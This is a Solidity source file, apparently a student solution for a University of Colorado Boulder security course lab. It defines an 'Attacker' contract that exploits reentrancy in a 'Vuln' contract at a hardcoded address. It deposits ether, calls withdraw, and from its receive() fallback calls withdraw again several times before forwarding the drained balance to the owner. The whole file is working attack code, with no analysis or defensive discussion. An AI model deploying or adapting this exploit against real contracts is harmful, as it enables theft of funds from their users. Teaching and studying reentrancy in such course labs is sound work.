pragma solidity ^0.6.0;
import './vuln.sol';
// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL


contract Attacker {
  Vuln v= Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);
  address payable owner=msg.sender;
  uint i =0;

  function deposit() public payable {
    v.deposit{value:address(this).balance}();
  }
  function withdraw() public{
    v.withdraw();
  }

  receive  () external payable {
    if(i <=2){
      i += 1;
      v.withdraw();
    }
    i = 0;
    owner.transfer(address(this).balance);
  }
  
}